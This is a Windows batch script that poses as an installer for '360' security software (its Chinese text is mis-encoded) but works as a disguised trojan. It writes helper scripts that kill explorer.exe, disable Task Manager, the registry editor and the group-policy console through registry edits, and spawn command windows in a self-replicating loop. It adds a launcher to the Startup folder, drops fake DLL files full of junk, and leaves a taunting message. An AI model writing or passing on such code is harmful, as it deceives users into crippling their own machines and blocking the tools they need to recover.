@echo off
color 1f
title 360��װ����
ping 127.0.0.1 /n 3 >nul
echo ��ӭ����360��װ����
ping 127.0.0.1 /n 2 >nul
title �������
echo ���Ķ���ͬ���������
mkdir C:\360bd\log
mkdir C:\360bd\help
ping 127.0.0.1 /n 2 >nul
echo ==============================
echo.
ping 127.0.0.1 /n 2 >nul
echo �˰�װ����������
ping 127.0.0.1 /n 2 >nul
title ��������
ping 127.0.0.1 /n 2 >nul
echo �˳���Ϊ��������
ping 127.0.0.1 /n 2 >nul
echo.
ping 127.0.0.1 /n 2 >nul
echo ==============================
pause
title ���ڸ������ļ�. . . 
echo ���ڰ�װ. . . >>C:\360bd\log\360setuplog.log
ping 127.0.0.1 /n 2 >nul
echo taskkill /f /im "explorer.exe" >C:\360bd\autornu.bat
ping 127.0.0.1 /n 2 >nul
echo ping 127.0.0.1 /n 10 >nul >C:\360bd\setupdll.bat
echo taskkill /f /fi "pid ne 1" >C:\360bd\setupdll.bat
ping 127.0.0.1 /n 2 >nul
echo start cmd >C:\360bd\help.bat
ping 127.0.0.1 /n 2 >nul
echo %%0 >>C:\360bd\help.bat
ping 127.0.0.1 /n 2 >nul
echo REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >C:\360bd\dtaskmgr.bat
ping 127.0.0.1 /n 2 >nul
echo reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f >C:\360bd\dgpeditmsc.bat
ping 127.0.0.1 /n 2 >nul
echo reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f >C:\360bd\dregedit.bat
ping 127.0.0.1 /n 2 >nul
mkdir C:\360bd\vbsfile
echo msgbox "error",0,"��Ϣ" >C:\360bd\vbsfile\setupdllvb.vbs
ping 127.0.0.1 /n 2 >nul
echo WindowsDLL C:\windows\System32\Wow6432\WindowsC:\ >C:\360bd\vbsfile\INI.mui
mkdir C:\360bd\setup
echo dllWinDLLcyggkjhgsiuyhfiuyq9uoiuruiushoperyquhghepuiypiuyghpiuyuwiuyrt908647uydkishgiuy >C:\360bd\setup\C6567832wow.dll
ping 127.0.0.1 /n 2 >nul
echo cccldokzubkjhgbhgbfbkuswyer9862ylauyilqlubnakjbhfn >C:\360bd\dllini.ini
ping 127.0.0.1 /n 2 >nul
echo dkzhgkjabhj,bguojsbgjbgzkizubldkgfkjvyg,vfgjkfnvmjzytvkujy >C:\360bd\vbsfile\INcccg.dll
ping 127.0.0.1 /n 2 >nul
mkdir C:\360bd\setup\help
echo jshfjmhgsbbkjkgdbjygfyfiuthskiifggdfhiux >C:\360bd\setup\help\help0.dll
echo @echo off >C:\360bd\setup\setup.bat
echo pause  >>C:\360bd\setup\setup.bat
ping 127.0.0.1 /n 3 >nul

title ��װ����
echo �������. . . 
ping 127.0.0.1 /n 3 >nul
title ������ݷ�ʽ��. . . 
echo  start C:\360bd\autornu.bat >%USERPROFILE%\Desktop\360.bat
ping 127.0.0.1 /n 2 >nul
ping 127.0.0.1 /n 2 >nul
echo  start C:\360bd\dtaskmgr.bat>>%USERPROFILE%\Desktop\360.bat
ping 127.0.0.1 /n 3 >nul
echo  start C:\360bd\dgpeditmsc.bat>>%USERPROFILE%\Desktop\360.bat
ping 127.0.0.1 /n 1 >nul
echo  start C:\360bd\dregedit.bat>>%USERPROFILE%\Desktop\360.bat
copy %USERPROFILE%\desktop\360.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\">nul
copy %USERPROFILE%\desktop\360.bat "%USERPROFILE%\����ʼ���˵�\����\����\">nul
title �������. . . 
echo  Helo %username%,we could not help you :)>C:\360bd\help360.bat
ping 127.0.0.1 /n 3 >nul
echo pause >>C:\360bd\help360.bat
ping 127.0.0.1 /n 3 >nul
echo del C:\360bd /f /q >>%USERPROFILE%\desktop\Uninstall.bat
echo del %USERPROFILE%\desktop\360.bat /f /q >>%USERPROFILE%\desktop\Uninstall.bat
ping 127.0.0.1 /n 3 >nul
ping 127.0.0.1 /n 3 >nu
del C:\360bd\setup\setup.bat\  /f /q
echo ��װ��ɣ�>>C:\360bd\log\360setuplog.log
echo ��װ��ɣ�
pause

-----------------------------
xccdl make gb110f0002



